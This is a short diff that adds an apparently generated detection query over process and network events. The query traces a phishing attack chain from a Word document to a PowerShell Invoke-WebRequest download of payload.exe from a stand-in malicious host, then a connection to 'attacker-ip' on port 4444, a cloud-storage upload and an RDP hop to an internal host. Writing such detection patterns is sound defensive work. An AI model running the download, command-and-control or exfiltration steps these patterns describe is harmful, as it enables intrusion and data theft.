@@ -1,0 +1,8 @@
+<output>
+(srcNode.Name: "Outlook" AND srcNode.relation: "Process Create" AND dstNode.Type: "File" AND dstNode.Name: "Update_Document.docx") OR 
+(srcNode.Name: "WINWORD.EXE" AND srcNode.relation: "Process Create" AND dstNode.Image: "powershell.exe" AND dstNode.Cmdline: "*Invoke-WebRequest -Uri http://malicious-server.com/payload.exe*") OR 
+(srcNode.Name: "explorer.exe" AND srcNode.relation: "Process Create" AND dstNode.Type: "Process" AND dstNode.Name: "payload.exe") OR 
+(srcNode.Name: "payload.exe" AND srcNode.relation: "TCP Connect" AND dstNode.Dstaddress: "attacker-ip" AND dstNode.Port: 4444) OR 
+(srcNode.Name: "cmd.exe" AND srcNode.relation: "Process Create" AND dstNode.Name: "chrome.exe" AND dstNode.Cmdline: "*https://cloud-storage.com/upload*") OR 
+(srcNode.Name: "explorer.exe" AND srcNode.relation: "Process Create" AND dstNode.Cmdline: "*mstsc /v:target-internal-ip*")
+</output>
